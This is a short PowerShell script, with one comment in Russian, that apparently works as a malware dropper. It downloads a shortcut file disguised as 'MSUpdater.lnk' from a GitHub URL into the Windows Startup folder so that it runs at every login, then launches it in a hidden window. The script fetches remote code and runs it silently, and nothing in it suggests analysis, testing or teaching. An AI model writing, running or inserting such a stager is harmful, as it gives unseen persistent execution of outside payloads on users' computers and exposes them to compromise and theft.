$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/MSUpdater.lnk"
cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
$destPath = ".\MSUpdater.lnk"
try {
    if (-not (Test-Path $destPath)) {
        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
    }
} catch {
    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
}
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MSUpdater.lnk" -WindowStyle Hidden
